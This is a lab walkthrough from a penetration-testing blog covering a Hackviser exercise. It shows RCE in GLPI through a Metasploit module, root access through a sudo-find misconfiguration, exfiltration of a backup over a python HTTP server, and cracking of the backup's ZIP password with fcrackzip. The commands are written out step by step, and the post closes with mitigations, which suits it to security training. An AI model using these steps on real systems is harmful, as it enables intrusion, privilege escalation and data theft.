---
title: "Remote Code Execution – GLPI Exploit to Root & ZIP Password Cracking | Find and Crack"
date: 2026-03-30 12:30:00 +0530
categories: [Penetration Testing]
tags: [
  remote-code-execution,
  glpi,
  privilege-escalation,
  sudo-misconfiguration,
  gtfobins,
  zip-password-cracking,
  fcrackzip,
  linux,
  hackviser
]
platform: Hackviser
author: Shivansh Sharma
image: { path: /assets/images/posts/privilege-escalation.webp, alt: "GLPI Exploitation and Password Cracking" }
---

## Overview

This lab demonstrates a complete attack chain involving web application exploitation, privilege escalation via misconfigured sudo permissions, and cracking encrypted files.

The target runs a vulnerable GLPI instance which allows remote command execution. After gaining access, privilege escalation is achieved through a misconfigured `find` binary, followed by password cracking of a protected backup archive.

---

## Objective

- Enumerate services and identify vulnerabilities
- Exploit GLPI for initial access
- Escalate privileges using sudo misconfiguration
- Extract and crack a password-protected archive

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV energysolutions.hv
```

Result:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56
3306/tcp open  mysql   MariaDB 10.5.21
```

### Directory Enumeration

```bash
gobuster dir -u http://energysolutions.hv -w /usr/share/wordlists/dirb/big.txt
```

No useful directories discovered.

### Web Application Discovery

Browsing the site reveals an IT Management panel:

```
http://energysolutions.hv/glpi/
```

This is a login portal for GLPI.

Footer indicates:

```
GLPI Copyright (C) 2015–2022
```

---

## Vulnerability Identification

Search for available exploits:

```bash
search GLPI
```

Relevant module:

```
exploit/linux/http/glpi_htmlawed_php_injection
```

This vulnerability allows remote command execution.

---

## Exploitation

### Metasploit Exploit

```bash
msfconsole
search GLPI
use exploit/linux/http/glpi_htmlawed_php_injection
```

Set parameters:

```bash
set RHOSTS energysolutions.hv
set LHOST <your_ip>
exploit
```

### Initial Access

```bash
whoami
```

```
www-data
```

---

## Post-Exploitation

### Sensitive File Discovery

```bash
cd /var/www/html/glpi/config
ls
```

```
config_db.php
glpicrypt.key
```

Retrieve database credentials:

```bash
cat config_db.php
```

```
dbuser = glpiuser
dbpassword = glpi-password
```

---

## Privilege Escalation

### Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Check Sudo Permissions

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /bin/find
```

### Exploit Sudo Misconfiguration

Using GTFOBins technique:

```bash
sudo find . -exec /bin/sh \; -quit
```

### Root Access

```bash
whoami
```

```
root
```

---

## Sensitive Data Discovery

Search for backup files:

```bash
sudo find / -name "*backup*" 2>/dev/null
```

Interesting file:

```
/root/backup.zip
```

### Exfiltration

Start a server on target:

```bash
python3 -m http.server 8888
```

Download via browser:

```
http://energysolutions.hv:8888/
```

---

## Password Cracking

### Using fcrackzip

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```

Password found:

```
asdf;lkj
```

### Extract Archive

```bash
unzip backup.zip
```

### Extracted Data

`computers.csv` — Contains internal asset and user data, including:

- Employee names
- Device assignments
- System usage details
- Internal comments (security hints)

---

## Proof of Exploitation

- ✅ RCE via GLPI vulnerability
- ✅ Shell access as `www-data`
- ✅ Privilege escalation via sudo misconfiguration
- ✅ Root access achieved
- ✅ Encrypted archive cracked successfully

---

## Impact

- Full system compromise
- Exposure of internal organizational data
- Weak password protection on sensitive backups
- Misconfigured sudo permissions enabling privilege escalation

---

## Mitigation

- Update GLPI to latest secure version
- Restrict access to admin panels
- Remove unnecessary sudo permissions
- Use strong encryption passwords
- Monitor sensitive file access
- Implement least privilege model

---

## Real-World Insight

Applications like GLPI are widely used in enterprise environments. Misconfigurations combined with outdated versions can lead to critical vulnerabilities.

Password-protected backups are often assumed secure, but weak passwords make them trivial to crack using common wordlists.

---

## Key Takeaways

- Always check for public exploits in web apps
- Misconfigured sudo is a critical escalation vector
- Sensitive files often reside in predictable locations
- Password-protected files are only as strong as their passwords
- Chaining vulnerabilities leads to full compromise
